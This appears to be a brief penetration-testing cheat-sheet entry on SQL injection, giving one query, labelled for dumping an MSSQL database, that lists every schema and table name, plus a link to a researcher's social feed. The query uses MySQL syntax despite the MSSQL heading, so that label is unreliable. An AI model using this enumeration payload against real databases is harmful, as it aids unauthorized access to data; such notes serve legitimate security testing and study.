# SQLi

### Dump MSSQL Database

```text
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

### Resources

[https://twitter.com/ptswarm](https://twitter.com/ptswarm)

